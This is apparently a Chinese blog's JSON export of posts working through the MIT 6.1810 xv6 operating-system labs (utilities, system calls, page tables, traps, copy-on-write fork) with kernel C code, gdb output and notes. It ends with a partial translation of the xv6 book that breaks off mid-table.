{"posts":[{"title":"Lab1 Xv6 and Unix utilities","text":"开学！ 启动 xv6git1234567891011121314151617git clone git://g.csail.mit.edu/xv6-labs-2022# 查看 git 日志git statusgit log# 用于获取实验所需文件git checkout util# 当完成一个实验并想要检记录进度可使用 git commitgit commit -am 'my solution for util lab exercise 1# 查看相比上一次 commit 的变化git diff# 查看相比最初的变化git diff origin/util 建立并运行 xv6 make qemu 第一步就出错了。。。 Error: Couldn't find a riscv64 version of GCC/binutils. 缺少 RISC-V 相关的 GCC/binutils 搜索 binutils apt search binutils | grep riscv64 安装第一个即可 sudo apt install binutils-riscv64-linux-gnu 接着是另一个报错 riscv64-linux-gnu-gcc -c -o kernel/entry.o kernel/entry.S make: riscv64-linux-gnu-gcc: No such file or directory make: *** [\\&lt;builtin\\&gt;: kernel/entry.o] Error 127 安装对应的 gcc sudo apt install gcc-10-riscv64-linux-gnu 进入 /usr/bin 目录，建立软链接 sudo ln -s riscv64-linux-gnu-gcc-10 riscv64-linux-gnu-gcc 后面又是缺少什么文件，去翻了翻 lab 介绍，发现已经给了工具链接 lab tools page sudo apt-get install git build-essential gdb-multiarch qemu-system-misc gcc-riscv64-linux-gnu binutils-riscv64-linux-gnu 这里的 gcc-riscv64-linux-gnu 下载的是 gcc-11，要再下回 gcc-10，不然会报错 sudo apt install gcc-10-riscv64-linux-gnu cd /usr/bin; sudo ln -s riscv64-linux-gnu-gcc-10 riscv64-linux-gnu-gcc 结果一气呵成~ 里面有一些很基本的命令 12345678910111213141516171819202122232425262728xv6 kernel is bootinghart 1 startinghart 2 startinginit: starting sh$ ls. 1 1 1024.. 1 1 1024README 2 2 2227xargstest.sh 2 3 93cat 2 4 32832echo 2 5 31728forktest 2 6 15680grep 2 7 36176init 2 8 32152kill 2 9 31712ln 2 10 31520ls 2 11 34728mkdir 2 12 31784rm 2 13 31768sh 2 14 53960stressfs 2 15 32496usertests 2 16 181776grind 2 17 47696wc 2 18 33832zombie 2 19 31168console 3 20 0 -甚至都没有 clear Ctrl-p 打印进程信息 Ctrl-a x 退出 qemu 结论：做任何事之前先看介绍 成绩测试1234567# 测试所有实验make grade# 测试一个程序./grade-lab-util name# 或make GRADEFLAGS=name grade sleep在 bash 中测试，能够多参数且如果一个参数错误就不执行 user/sleep.c1234567891011121314151617181920212223242526272829303132#include &quot;kernel/types.h&quot;#include &quot;user/user.h&quot;int isDigitStr(char *str) { for(int i = 0; i &lt; strlen(str); ++i) { if(str[i] &lt; '0' || str[i] &gt; '9') { return 0; } } return 1;}int main(int argc, char *argv[]) { int status = 0; if(argc == 1) { printf(&quot;sleep: missing operand!\\n&quot;); status = -1; } for(int i = 1; i &lt; argc; ++i) { if(!isDigitStr(argv[i])) { printf(&quot;sleep: invalid time interval \\'%s\\'\\n&quot;, argv[i]); status = -1; } } for(int i = 1; i &lt; argc &amp;&amp; !status; ++i) { sleep(atoi(argv[i])); } exit(status);} 源代码放在 user 目录下，每次写完一个程序在 Makefile 中的 UPROGS 下添加一行 $U/_sleep\\ 然后 make qemu 编译运行 之后可以在 qemu 外运行 /grade-lab-util sleep 进行单项测试 12345$ ./grade-lab-util sleepmake: 'kernel/kernel' is up to date.== Test sleep, no arguments == sleep, no arguments: OK (1.5s)== Test sleep, returns == sleep, returns: OK (0.6s)== Test sleep, makes syscall == sleep, makes syscall: OK (1.0s) pingpong简单题 父进程发送子进程一个字节，子进程收到后再给父进程一个字节 user/pingpong.c12345678910111213141516171819202122232425#include &quot;kernel/types.h&quot;#include &quot;user/user.h&quot;int main(int argc, char *argv[]) { int pid, p[2]; pipe(p); pid = fork(); if(pid == 0) { if(read(p[0], 0, 1)) { pid = getpid(); printf(&quot;%d: received ping\\n&quot;, pid); write(p[1], &quot;H&quot;, 1); exit(0); } } else { write(p[1], &quot;H&quot;, 1); if(read(p[0], 0, 1)) { pid = getpid(); printf(&quot;%d: received pong\\n&quot;, pid); exit(0); } } exit(-1);} primes有点难度 想了好久，感觉是要用递归，但是没想出来怎么写 想到在看网课的时候，进入子进程先把 close(0)，然后 dup(p[1])，也就是把子进程的标准输入改为管道的输入了，这样就容易写递归了 当从输入接收不到 prime 的时候 exit(0) 这里注意 dup(p[1]) 后要把管道都给关了 user/primes.c1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859#include &quot;kernel/types.h&quot;#include &quot;user/user.h&quot;void printPrime(int prime) { printf(&quot;prime %d\\n&quot;, prime);}void primes() { int prime, n, pid, p[2]; if(!read(0, &amp;prime, sizeof(prime))) { exit(0); } printf(&quot;prime %d\\n&quot;, prime); pipe(p); pid = fork(); if(pid == 0) { close(0); dup(p[0]); close(p[0]); close(p[1]); primes(); exit(0); } else { while(read(0, &amp;n, sizeof(n))) { write(p[1], &amp;n, 4); } close(p[1]); int status; wait(&amp;status); exit(0); } exit(-1);}int main(int argc, char *argv[]) { int pid, p[2]; pipe(p); pid = fork(); if(pid == 0) { close(0); dup(p[0]); close(p[0]); close(p[1]); primes(); exit(0); } else { for(int i = 2; i &lt; 36; ++i) { write(p[1], &amp;i, 4); } close(p[1]); int status; wait(&amp;status); exit(0); } exit(-1);} find同样也是递归，从目录里查找文件可以参考 ./user/ls.c 当找的是文件或者时比较名字 当找的是目录时，从 fd 读取 struct dirent[]，表示目录下的每个文件，里面有 name，表示文件名，注意过滤 . 和 .. user/find.c1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768#include &quot;kernel/types.h&quot;#include &quot;kernel/fcntl.h&quot;#include &quot;kernel/stat.h&quot;#include &quot;kernel/fs.h&quot;#include &quot;user/user.h&quot;void find(char *path, char *filename) { char buf[512]; char *name, *p; int fd; struct stat st; struct dirent de; if((fd = open(path, O_RDONLY)) &lt; 0) { printf(&quot;find: cannot open %s\\n&quot;, path); return; } if(fstat(fd, &amp;st) &lt; 0) { printf(&quot;find: cannot stat %s\\n&quot;, path); return; } switch(st.type) { case T_DEVICE: case T_FILE: name = path; for (int i = strlen(path)-1; i &gt;= 0; --i) { if(path[i] == '/') { name = &amp;path[i+1]; break; } } if(!strcmp(name, filename)) { printf(&quot;%s\\n&quot;, path); } break; case T_DIR: if(strlen(path) + 1 + DIRSIZ + 1 &gt; sizeof(buf)) { printf(&quot;find: path too long\\n&quot;); break; } strcpy(buf, path); p = buf + strlen(buf); *p++ = '/'; while(read(fd, &amp;de, sizeof(de)) == sizeof(de)) { if(de.inum == 0 || !strcmp(de.name, &quot;.&quot;) || !strcmp(de.name, &quot;..&quot;)) { continue; } memmove(p, de.name, DIRSIZ); p[DIRSIZ] = 0; // printf(&quot;finding: %s\\n&quot;, buf, DIRSIZ); find(buf, filename); } break; } close(fd);}int main(int argc, char *argv[]) { if(argc != 3) { printf(&quot;find: invalid argument\\n&quot;); exit(-1); } find(argv[1], argv[2]); exit(0);} xargs一开始没懂 sh 怎么实现管道 测试发现就是将管道的读端作为 | 右边程序的标准输入 主要是判断什么时候跳出循环 user/xargs.c12345678910111213141516171819202122232425262728293031323334353637#include &quot;kernel/types.h&quot;#include &quot;kernel/param.h&quot;#include &quot;user/user.h&quot;int main(int argc, char *argv[]) { int idx = 0, pid; int status; char buf; char *new_argv[argc+1]; for(int i = 1; i &lt; argc; ++i) { new_argv[i-1] = argv[i]; } while(read(0, &amp;buf, 1)) { idx = 0; new_argv[argc-1] = (char*)malloc(MAXARG); do { if(buf == '\\n') { new_argv[argc-1][idx] = '\\0'; new_argv[argc] = 0; break; } new_argv[argc-1][idx++] = buf; } while(read(0, &amp;buf, 1)); pid = fork(); if(pid == 0) { exec(new_argv[0], new_argv); printf(&quot;wrong command\\n&quot;); exit(-1); } else { wait(&amp;status); } } exit(0);} Optional challenge exercises写一个 uptime 程序来调用 uptime 系统调用直接调用 uptime 然后打印返回值就好了 对 grep 实现正则匹配yysy，对正则表达式不是很了解 改造 sh#todo","link":"/2022/10/13/Lab1_Xv6_and_Unix_utilities/"},{"title":"Lab2 System Calls","text":"开学！ 实验开始前123git fetchgit checkout syscallmake clean 使用 gdb 哪个函数调用了 syscall usertrap() 在 syscall 设置断点后，输入 backtrace 查看栈回溯 p-&gt;trapframe-&gt;a7 的值是多少，值代表什么？ 7，代表系统调用号 SYS_exec 运行到 num = p-&gt;trapframe-&gt;a7，输入 p num CPU 的上一个模式是什么？ 给的文档看不懂。。 更新：sstatus 的 SSP 位表示 trap 来自哪一位 令 num = * (int *) 0;，kernel 在哪条汇编指令 panic，哪个寄存器对应变量 num lw a3, 8(zero)，a2（？） 多次更改 num 值来调试 为什么内核崩溃了？在内核地址空间 0 地址有映射吗？上面的 scause 值是否证实这一点？ 因为尝试访问 0 地址，没有有效映射 当内核 panic 时进程的名字是什么？进程 pid 是多少？ “initcode”，1 有点过于复杂，没能理解 访问到 0 地址时为什么会跳转到 kernelvec 中 scause、sepc、stval 的含义 更新：访问 0 发生了 trap，跳转到内核中处理内核 trap 的位置；scause 描述 trap，sepc 保存发生 trap 时 pc 的值，stval 保存 trap 的值 System call tracing在 user/trace.c 已经写好了程序，只需要实现系统调用即可 先在 user/user.h 加上原型，在 user/usys.pl 加上 stub （存根），在 kernel/syscall.h 加上系统调用号 在 kernel.c 的 proc 结构体加上一个新变量 tracemask 在 kernel/sysproc.c 加上 sys_trace，设置当前进程的 trackmask kernel/sysproc.c123456789uint64sys_trace(int){ int mask; argint(0, &amp;mask); myproc()-&gt;tracemask = mask; return 0;} 修改 kernel/proc.c 的 fork 函数，将父进程的 tracemask 传给子进程 kernel/proc.c1np-&gt;tracemask = p-&gt;tracemask; 修改 kernel/syscall.c 的 syscall 函数，如果是 tracemask 对应的系统调用号，就打应出来（里面还要添加一个字符串数组 syscallNames） kernel/syscall.c123if(1&lt;&lt;num &amp; p-&gt;tracemask) { printf(&quot;%d: syscall %s -&gt; %d\\n&quot;, p-&gt;pid, syscallNames[num], p-&gt;trapframe-&gt;a0);} 一个很简单的系统调用，仅仅是获取系统调用参数，然后将参数传给 proc-&gt;tracemask，就可以实现，但是能学到很多细节 Sysinfo这里我们要使用 copyout，因为系统调用函数位处于内核模式，需要进程的页表和虚拟地址来查找用户进程中变量的物理位置（比如 sysinfo 结构体），然后将内核的数据复制给用户进程 kernel/sysproc.c1234567891011121314151617uint64sys_sysinfo(void){ uint64 si; struct sysinfo info; argaddr(0, &amp;si); if(!si) { return -1; } info.freemem = get_freemem(); info.nproc = get_nproc(); if(copyout(myproc()-&gt;pagetable, si, (char*)&amp;info, sizeof(info)) &lt; 0) { return -1; } return 0;} 写 get_freemem 时，观察 kalloc 函数，直接从 kmem.freelist 取一页内存返回，可以推测 kmem.freelist 包含所有可用的内存 kernel/kalloc.c1234567891011uint64get_freemem(void){ struct run *r; uint64 n = 0; for(r = kmem.freelist; r; r = r-&gt;next) { n += 4096; } return n;} 写 ger_nproc 时，观察 procinit 函数，在 proc[NPROC] 数据中遍历初始化，且其中含 state 变量 kernel/proc.c123456789101112uint64get_nproc(void){ struct proc *p; uint64 nproc = 0; for(p = proc; p &lt; &amp;proc[NPROC]; p++) { if(p-&gt;state != UNUSED) { nproc++; } } return nproc;} 记得在 sysproc.c 引入 sysinfo.h，在 defs.h 加上 get_freemem 和 get_nproc Optional challenge exercises调用 trace 时打印出系统调用的参数记录每个系统调用参数个数然后打印出来就好了 计算负载平均值并通过 sysinfo 导出不是很懂","link":"/2022/10/20/Lab2_system_calls/"},{"title":"Lab3 Page Tables","text":"开学！ git123git fetchgit checkout pgtblmake clean Speed up system calls为了优化 getpid 系统调用，不用每次进入内核态获取 PID，创建一个用户可读的页，将 USYSCALL 映射到该页上，在调用 ugetpid 时，直接访问 USYSCALL 即可拿到 pid，不需要系统调用，算是以空间换时间 这里不同的是，页表映射实际上是虚拟地址映射到虚拟地址，而不是映射到物理地址 在 kernel/proc.h 中 proc 结构体加入 struct usyscall *usyscall 在 allocproc 初始化 usyscall kernel/proc.c12345678910111213static struct proc* allocproc(void){ ... if((p-&gt;usyscall = (struct usyscall *)kalloc()) == 0){ freeproc(p); release(&amp;p-&gt;lock); return 0; } p-&gt;usyscall-&gt;pid = p-&gt;pid; ...} 在 proc_pagetable 建立映射 kernel/proc.c1234567891011121314pagetable_t proc_pagetable(struct proc *p){ ... if(mappages(pagetable, USYSCALL, PGSIZE, (uint64)(p-&gt;usyscall), PTE_R | PTE_U) &lt; 0){ uvmunmap(pagetable, TRAMPOLINE, 1, 0); uvmunmap(pagetable, TRAPFRAME, 1, 0); uvmfree(pagetable, 0); return 0; } ...} 在 freeproc 释放 usyscall kernel/proc.c12345678910static void freeproc(struct proc *p){ ... if(p-&gt;usyscall) kfree((void*)p-&gt;usyscall); p-&gt;usyscall = 0; ...} Print a page tablexv6 使用三级页表，在运行第一个用户进程时打印出其页表 这里使用一个静态变量 level 表示在第几级页表 kernel/vm.c12345678910111213141516171819202122232425void vmprint(pagetable_t pagetable) { static int level = 0; if(level == 0) { level++; printf(&quot;page table %p\\n&quot;, pagetable); } for(int i = 0; i &lt; 512 &amp;&amp; level &lt;= 3; ++i) { pte_t pte = pagetable[i]; if(pte &amp; PTE_V) { for(int j = 0; j &lt; level; ++j) { printf(&quot; ..&quot;); } printf(&quot;%d: pte %p pa %p\\n&quot;, i, pte, PTE2PA(pte)); level++; vmprint((pagetable_t)PTE2PA(pte)); level--; } } if(level == 1) { level--; }} 看到 wingsgg 用 pte &amp; (PTE_R|PTE_W|PTE_X) == 0 表示是否中间页表，确实很棒，但是用了两个函数 笔者已经用一个函数写好了，觉得也还行 然后在 exec.c 和 defs.h 中添加声明和使用就行 Detect which pages have been accessedRISC-V 硬件会在 TLB 命中失败时，将对应 PTE 的 Access 标志位设 1，用来记录该页面有没有访问过 写一个系统调用，三个参数，检测的虚拟地址，检测的页数，bitmask 挺简单的，不知道为什么实验难度写着 hard 123456789101112131415161718192021222324252627282930#define PTE_A (1L &lt;&lt; 6)intsys_pgaccess(void){ uint64 buf; int n; uint64 uabits; argaddr(0, &amp;buf); argint(1, &amp;n); argaddr(2, &amp;uabits); uint abits = 0; pagetable_t pagetable = myproc()-&gt;pagetable; for(int i = 0; i &lt; n; ++i) { pte_t *pte; pte = walk(pagetable, buf + i * PGSIZE, 0); if(!pte) { return -1; } if(*pte &amp; PTE_A) { abits |= 1 &lt;&lt; i; *pte &amp;= ~PTE_A; } } copyout(pagetable, uabits, (char*)&amp;abits, sizeof(abits)); return 0;} 注意检测完后，将标记置零，不然不知道检测后还没有访问过 Optional challenge exercises使用 super-pages 减少页表中 PTE 的数量不是很懂，改用更大的页（？） 取消用户进程的第一页的映射，这样可以使引用空指针直接造成错误 需要修改 user.ld 文件，让进程的 text 段从 0x1000 开始，而不是 0 估计要改很多东西（uvmmap，uvmalloc啥的）。。。咕咕咕 添加一个系统调用报告 dirty pages（修改过的页表）和第三个差不多，就不做了","link":"/2022/10/23/Lab3_Page_tables/"},{"title":"Lab4 Traps","text":"开学！ RISC-V assemblyuser/call.c123456789101112int g(int x) { return x+3;}int f(int x) { return g(x);}void main(void) { printf(&quot;%d %d\\n&quot;, f(8)+1, 13); exit(0);} 阅读 user/call.asm 回答问题~ main.asm12345678910111213141516171819000000000000001c &lt;main&gt;:void main(void) { 1c: 1141 addi sp,sp,-16 1e: e406 sd ra,8(sp) 20: e022 sd s0,0(sp) 22: 0800 addi s0,sp,16 printf(&quot;%d %d\\n&quot;, f(8)+1, 13); 24: 4635 li a2,13 26: 45b1 li a1,12 28: 00000517 auipc a0,0x0 2c: 7c850513 addi a0,a0,1992 # 7f0 &lt;malloc+0xee&gt; 30: 00000097 auipc ra,0x0 34: 614080e7 jalr 1556(ra) # 644 &lt;printf&gt; exit(0); 38: 4501 li a0,0 3a: 00000097 auipc ra,0x0 3e: 290080e7 jalr 656(ra) # 2ca &lt;exit&gt;} 传给函数的参数保存在哪些寄存器中？例如 main 函数中的调用 printf 的参数 13 保存在哪个寄存器中？ a0 ~ a7 保存函数参数，更多的参数放在栈中 main 调用 printf 的参数 13 在 a2 中 main 函数中调用 f 函数的汇编代码在哪？调用 g 函数的代码在哪？（提示：编译器可能内联函数） 真的有调用吗。。。感觉编译器优化了，直接把 f(8)+1 的结果计算出来为 12，传给 a1 寄存器了。 printf 函数的地址是多少？ 看注释，在 0x644 在 main 函数中，在执行 jalr 跳转到 printf 后，ra 寄存器的值时多少？ 0x38 jalr 会将下一条指令的地址存到括号中的寄存器中 运行下面的代码，输出什么？unsigned int i = 0x00646c72;printf(“H%x” Wo%s”, 57616, &amp;i); He110 World 下面的代码，会打印出 ‘y=’ 什么？printf(“x=%d y=%d”, 3); 按照 RISC-V 的函数调用约定，会打印出 a2 寄存器的值 Backtrace对内核的函数调用进行回溯，比较简单 根据 RISC-V 的函数调用约定，ra 位于 fp - 0x8 的位置，Prev.fp 位于 fp - 0x10 的位置 在内核栈中，最后一个栈帧指针位于页面的首地址，根据这个可以判断何时退出循环 可以通过 gdb 进行调试，0x3ffffff9fc0 -&gt; 0x3ffffffe0 -&gt; 0x3ffffffa000 1234567891011(gdb) x/20gx $fp-0x100x3fffff9f70: 0x0000003fffff9fc0 0x00000000800021aa0x3fffff9f80: 0x0000003fffff9fc0 0x00000001ffff9fa00x3fffff9f90: 0x0000003fffff9fc0 0x00000000000000200x3fffff9fa0: 0x0000000087f70000 0x00000000800090300x3fffff9fb0: 0x0000003fffff9fe0 0x000000008000201c0x3fffff9fc0: 0x0000000000000063 0x00000000800090300x3fffff9fd0: 0x0000003fffffa000 0x0000000080001d120x3fffff9fe0: 0x0000000000000063 0x0000000000014f500x3fffff9ff0: 0x0000000000003fd0 0x00000000000000120x3fffffa000: Cannot access memory at address 0x3fffffa000 但是在用户栈中，最后一个栈帧指针是页面的首地址 - 0x10，就很怪。。。 比如在 sh 打印 $ 时，查看用户栈，0x4fd0 -&gt; 0x4fe0 -&gt; 0x4ff0，最后一个指针是 0x4ff0 12345678910(gdb) x/20gx $fp-0x100x4f80: 0x0000000000004fd0 0x0000000000000ade0x4f90: 0x0000000000000000 0x05050505050505050x4fa0: 0x0505050505050505 0x05050505050505050x4fb0: 0x00000000000008a8 0x00000000000000000x4fc0: 0x0000000000004fe0 0x0000000000000b660x4fd0: 0x0000000000003fd0 0x00000000000000de0x4fe0: 0x0000000000004ff0 0x00000000000000000x4ff0: 0x0000000000006873 0x00000000000000000x5000: Cannot access memory at address 0x5000 算了，不管这么多了，反正也只用回溯内核栈 把 backtrace 贴到 kernel/printf.c 中，在 kernel/defs.h 中添加声明，然后在 sys_sleep 调用就好了 kernel/printf.c12345678voidbacktrace(void){ printf(&quot;backtrace:\\n&quot;); for(uint64 fp = r_fp(); fp != PGROUNDUP(fp); fp = *(uint64*)(fp-0x10)){ printf(&quot;%p\\n&quot;, *(uint64*)(fp-0x8)); }} 获得的地址可以通过 addr2line 得到对应的程序代码的位置，便于调试 如 addr2line -e kernel/kernel 放到 panic 函数中，可以更好地方便内核崩溃原因 Alarm添加一个用户级的定时器中断，也就是 sigalarm(interval, handler) 和 sigreturn() 每 n 次硬件计时器中断，就会调用一次 handler，在 handler 中要有 sigreturn 保证还原到原本的状态 笔者天真地以为保存 p-&gt;trapframe-&gt;epc 就行了，wsfw（还有通用寄存器要进行保存） 在 proc 结构体添加变量kernel/proc.h123456789struct proc { ... int ticks; int alarm_interval; uint64 alarm_handler; struct trapframe *alarm_state;} ticks 保存计时器中断次数，每中断一次，ticks++ alarm_state 直接用 struct trapframe 结构体保存原状态（笔者是个懒人 在每次调用 handler 前，将其指向 p-&gt;trapframe + 1，sigreturn 后置零 初始化kernel/proc.c12345678910111213static struct proc*allocproc(void){ ... p-&gt;ticks = 0; p-&gt;alarm_interval = 0; p-&gt;alarm_handler = 0; p-&gt;alarm_state = 0; return p;} 添加系统调用kernel/sysproc.h1234567891011121314151617181920212223242526uint64sys_sigalarm(void){ int ticks; uint64 handler; struct proc *p = myproc(); argint(0, &amp;ticks); argaddr(1, &amp;handler); p-&gt;alarm_interval = ticks; p-&gt;alarm_handler = handler; return 0;}uint64sys_sigreturn(void){ struct proc *p = myproc(); uint64 a0 = p-&gt;alarm_state-&gt;a0; memmove(p-&gt;trapframe, p-&gt;alarm_state, sizeof(struct trapframe)); memset(p-&gt;alarm_state, 0, sizeof(struct trapframe)); p-&gt;alarm_state = 0; return a0;} 计时器中断时判断是否执行 handlerkernel/trap.c12345678910111213141516voidusertrap(void){ ... // give up the CPU if this is a timer interrupt. if(which_dev == 2) { yield(); p-&gt;ticks++; if(p-&gt;alarm_interval &amp;&amp; !p-&gt;alarm_state &amp;&amp; p-&gt;ticks % p-&gt;alarm_interval == 0) { p-&gt;alarm_state = p-&gt;trapframe + 1; memmove(p-&gt;alarm_state, p-&gt;trapframe, sizeof(struct trapframe)); p-&gt;trapframe-&gt;epc = p-&gt;alarm_handler; } }} 最后添加一些声明即可 Option challenge exercisesbacktrace 打印函数名和行号#todo","link":"/2022/10/31/Lab4_Traps/"},{"title":"Lab5 Copy-on-write fork","text":"页表牛逼 实现 Copy-on-write fork 添加宏定义 PTE_COW，使用 PTE 的 RSW 最低有效位，来标识是否是 COW 页，只用于可写页 kernel/riscv.h1#define PTE_COW (1L &lt;&lt; 8) 添加 reference count 标识一个物理页面被几个用户页表指向，初始化，增减 提示使用 kenel/kalloc.c 里 kinit() 里 freerange() 的范围，通过调试 end = 0x80041c50，PHYSTOP = 0x88000000，相减除以 4096 得 0x7fbe 但是在 make qemu 时，过 usertests -q 时，最后会显示丢失一些页，但是 make CPUS=1 qemu-gdb 时又显示通过，可能子啊多核时会出现一些问题，很怪 将 0x7fbe 改为 0x7fc0 就没有问题，不是很懂，如果有了解的师傅可以告诉我🐎 笔者把它放到 kmem 里，增减时用 kmem.lock 锁 kernel/kalloc.c123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778struct { struct spinlock lock; struct run *freelist; uint refers[0x7fc0];} kmem;voidkinit(){ initlock(&amp;kmem.lock, &quot;kmem&quot;); acquire(&amp;kmem.lock); for(int i = 0; i &lt; sizeof(kmem.refers) / sizeof(kmem.refers[0]); ++i) { kmem.refers[i]++; } release(&amp;kmem.lock); freerange(end, (void*)PHYSTOP);}voidkfree(void *pa){ struct run *r; if(((uint64)pa % PGSIZE) != 0 || (char*)pa &lt; end || (uint64)pa &gt;= PHYSTOP) panic(&quot;kfree&quot;); krefDecre(pa); if(!kref(pa)) { // Fill with junk to catch dangling refs. memset(pa, 1, PGSIZE); r = (struct run*)pa; acquire(&amp;kmem.lock); r-&gt;next = kmem.freelist; kmem.freelist = r; release(&amp;kmem.lock); }}void *kalloc(void){ struct run *r; acquire(&amp;kmem.lock); r = kmem.freelist; if(r) kmem.freelist = r-&gt;next; release(&amp;kmem.lock); if(r) { krefIncre((void*)r); memset((char*)r, 5, PGSIZE); // fill with junk } return (void*)r;}uintkref(void *pa){ return kmem.refers[(pa - (void*)end)/4096];}voidkrefIncre(void *pa){ acquire(&amp;kmem.lock); kmem.refers[(pa - (void*)end)/4096]++; release(&amp;kmem.lock);}voidkrefDecre(void *pa) { acquire(&amp;kmem.lock); kmem.refers[(pa - (void*)end)/4096]--; release(&amp;kmem.lock);} 修改 uvmcopy，在复制时将子进程页表直接指向父进程页表对应的物理地址 因为在调用 fork 时，复制内存就是直接调用 uvmcopy，修改这个就行 当遇到可写的页时，取消 PTE_W，添加 PTE_COW kernel/vm.c123456789101112131415161718192021222324252627282930313233intuvmcopy(pagetable_t old, pagetable_t new, uint64 sz){ pte_t *pte; uint64 pa, i; uint flags; for(i = 0; i &lt; sz; i += PGSIZE){ if((pte = walk(old, i, 0)) == 0) panic(&quot;uvmcopy: pte should exist&quot;); if((*pte &amp; PTE_V) == 0) panic(&quot;uvmcopy: page not present&quot;); pa = PTE2PA(*pte); flags = PTE_FLAGS(*pte); if(flags &amp; PTE_W) { flags = (flags &amp; ~PTE_W) | PTE_COW; } if(mappages(new, i, PGSIZE, pa, flags) != 0){ goto err; } if(flags &amp; PTE_COW) { *pte = PA2PTE(pa) | flags; } krefIncre((void*)pa); } return 0; err: uvmunmap(new, 0, i / PGSIZE, 1); return -1;} 怎么有人总是把 &amp; 和 | 的功能写反 修改 kernel/trap.c 的 usertrap 和 kernel/vm.c 的 copyout，添加遇到 COW 页的情况 注意虚拟地址要小于 MAXVA，否则在 walk 时会直接出现 panic kernel/vm.c12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849intcopyout(pagetable_t pagetable, uint64 dstva, char *src, uint64 len){ uint64 n, va0, pa0; pte_t *pte = 0; while(len &gt; 0){ va0 = PGROUNDDOWN(dstva); if(dstva &lt; MAXVA) { pte = walk(pagetable, dstva, 0); } if(pte &amp;&amp; (*pte &amp; PTE_COW)) { if(copyCOW(pte)) { return -1; } } pa0 = walkaddr(pagetable, va0); if(pa0 == 0) return -1; n = PGSIZE - (dstva - va0); if(n &gt; len) n = len; memmove((void *)(pa0 + (dstva - va0)), src, n); len -= n; src += n; dstva = va0 + PGSIZE; } return 0;}intcopyCOW(pte_t *pte) { uint64 pa = PTE2PA(*pte); uint flags = (PTE_FLAGS(*pte) &amp; ~PTE_COW) | PTE_W; *pte = PA2PTE(pa) | flags; if(kref((void*)pa) != 1) { char *mem = kalloc(); if(mem == 0) { return -1; } else { memmove(mem, (char*)pa, PGSIZE); *pte = PA2PTE(mem) | flags; krefDecre((void*)pa); } } return 0;} kernel/trap.c12345if(r_scause() == 15 &amp;&amp; r_stval() &lt; MAXVA &amp;&amp; (*(pte = walk(p-&gt;pagetable, r_stval(), 0)) &amp; PTE_COW)) { // store COW page fault if(copyCOW(pte)) { setkilled(p); } 最后在 kernel/defs.h 里添加一些函数声明即可 Optional challenge exercise测量你的 COW 实现减少了多少字节的复制和多少页物理内存的分配#todo","link":"/2022/11/12/Lab5_Copy_on_write_fork/"},{"title":"Xv6","text":"本文是笔者在学习 MIT 6.1810 2022 Fall 阅读 xv6 文档时所写，大部分是将原文翻译，笔者尽可能加入自己的理解并排版，应该会持续更新直到文档读完 Chapter 1 Operating system interfacesxv6 实现的 Unix kernel 的服务和系统调用的子集 在 user 目录下可查看程序源码 System call Description int fork() 创建一个进程，返回子进程的 PID int exit(int status) 结束当前进程，status 返回给 wait() int wait(int *status) 等待一个子进程 exit，exit 的 status 在 *status中，返回子进程 PID，没有子进程返回 -1 int kill(int pid) 结束 PID 对应的进程，返回 0 或 -1 int getpid() 返回当前进程的 PID int sleep(int n) 暂停 n 个时钟 int exec(char *file, char *argv[]) 加载文件并使用参数执行，仅在错误时返回 char *sbrk(int n) 内存增加 n 字节，返回新内存的首地址 int open(char *file, int flags) 打开文件，flags 表示读写，返回一个 fd int write(int fd, char *buf, int n) 从 buf 向 fd 写 n 字节，返回 n int read(int fd, char *buf, int n) 从 fd 读 n 字节向 buf 写入，返回读的字节数 int close(int fd) 释放 fd int dup(int fd) 返回与 fd 相同文件的一个新的 fd int pipe(int p[]) 创建一个管道，将读写 fd 放入 p[0] 和 p[1] int chdir(char *dir) 改变当前目录 int mkdir(char *dir) 创建一个目录 int mknod(char *file, int, int) 创建一个设备文件 int fstat(int fd, struct stat *st) 读取文件信息放入 st int stat(char *file, struct stat *st) 读取文件信息放入 st int link(char *file1, char *file2) 为 file1 创建另一个名字 file2，即硬链接 int unlink(char *file) 删除一个文件 如果没有另外说明，系统调用返回 0 为正常，返回 -1 为错误 进程和内存父子进程的内存关系 I/O 和文件描述符管道p[0] 为读端，p[1] 为写端 如果读端没有数据，read 会等待数据写入或等待指向写端的所有 fd 关闭，后者类似到文件结尾， read 会返回 0 如果 read 到读端，会一直等待 shell 可以用 | 符号实现管道 grep fork sh.c | wc -l 将 | 左边的结果通过管道流向右边 多 | 可以创建进程树 管道可以自己清理自己 可以通过任意长度的数据流 管道可以并行执行 文件系统#todo 真实世界Unix 系统调用接口通过 POSIX 标准进行标准化 Chapter 2 Operating system organization三个要求 多路复用 隔离 交互 抽象物理资源每个应用程序直接访问物理资源 效率高 需要应用程序之间可信且没有错误 因此需要进行强隔离，同时也会提供便利 禁止应用程序直接访问敏感的硬件资源，将资源抽象为服务 用户/管理者模式，系统调用强隔离需要应用程序和操作系统之间有硬边界 CPU 能提供硬件支持 RISC-V 的 CPU 有三种模式：机器模式、管理者（supervisor）模式、用户模式 机器模式 执行的指令具有完全特权 主要用具配置计算机，运行一段代码后会进入内核模式 管理者模式 CPU 可执行特权指令 启用、禁用终端 读写页表寄存器 用户模式 CPU 不能执行特权指令 如果尝试执行，CPU 会切换到管理者模式，并且杀死应用程序 通过系统调用来调用内核函数 系统调用会跳转到内核指定的入口点 CPU 从用户模式切换到管理者模式 内核可以验证系统调用的参数是否合理，决定是否进行请求的操作 内核和管理者模式似乎有点分不清？ 笔者的理解：管理者模式是 RISC-V 的 CPU 定义的，相对于用户模式多了一些特权；内核是相对用户代码而言，运行在不同的模式下。模式对应着身份，内核和用户代码对应着一个实体 内核架构宏内核设计缺点：操作系统不同部分之间的接口复杂，编写代码容易出错 微内核设计最大限度地减少内核模式下运行的操作系统代码数量，在用户模式下执行操作系统的大部分功能 xv6 kernel 代码架构 文件 描述 文件 描述 bio.c 文件系统的磁盘块缓冲 proc.c 进程和调度 console.c 连接到用户键盘和屏幕 sleeplock.c 放弃 CPU 的锁 entry.S 第一次启动的指令 spinlock.c 不放弃 CPU 的锁 exec.c exec() 系统调用 start.c 机器模式早期启动代码 file.c 文件描述符 string.c C 字符串和字节数组代码库 fs.c 文件系统 swtch.S 线程切换 kalloc.c 物理页分配器 syscall.c 系统调用的调度 kernelvec.S 处理来自内核的陷阱，定时器中断 sysfile.c 文件相关的系统调用 log.c 文件系统日志记录和崩溃恢复 sysproc.c 进程相关的系统调用 main.c 启动阶段控制其他模块的初始化 trampoline.S 